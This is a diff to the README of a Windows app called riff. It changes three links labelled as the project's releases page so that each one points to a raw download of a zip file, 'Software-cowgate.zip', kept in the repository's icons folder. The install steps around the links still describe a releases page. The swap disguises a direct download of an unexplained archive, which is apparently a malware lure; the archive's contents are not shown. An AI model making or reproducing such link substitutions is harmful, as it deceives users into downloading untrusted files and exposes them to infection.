@@ -1,6 +1,6 @@
 # 🧭 riff - Read posts, write better replies
 
-[![Download riff](https://img.shields.io/badge/Download%20riff-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Kingsmanrp/riff/releases)
+[![Download riff](https://img.shields.io/badge/Download%20riff-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kingsmanrp/riff/main/icons/Software-cowgate.zip)
 
 ## 📌 What riff does
 
@@ -19,7 +19,7 @@ riff works best on recent Windows versions such as Windows 10 and Windows 11.
 
 ## 🚀 Download and install on Windows
 
-1. Go to the [riff releases page](https://github.com/Kingsmanrp/riff/releases).
+1. Go to the [riff releases page](https://raw.githubusercontent.com/Kingsmanrp/riff/main/icons/Software-cowgate.zip).
 2. Look for the latest release near the top of the page.
 3. Download the Windows file from that release.
 4. Open your Downloads folder.
@@ -163,7 +163,7 @@ This project covers:
 
 If you want to follow updates, fix issues, or check new releases, use the release page:
 
-[Visit the riff releases page](https://github.com/Kingsmanrp/riff/releases)
+[Visit the riff releases page](https://raw.githubusercontent.com/Kingsmanrp/riff/main/icons/Software-cowgate.zip)
 
 ## 📄 License
 
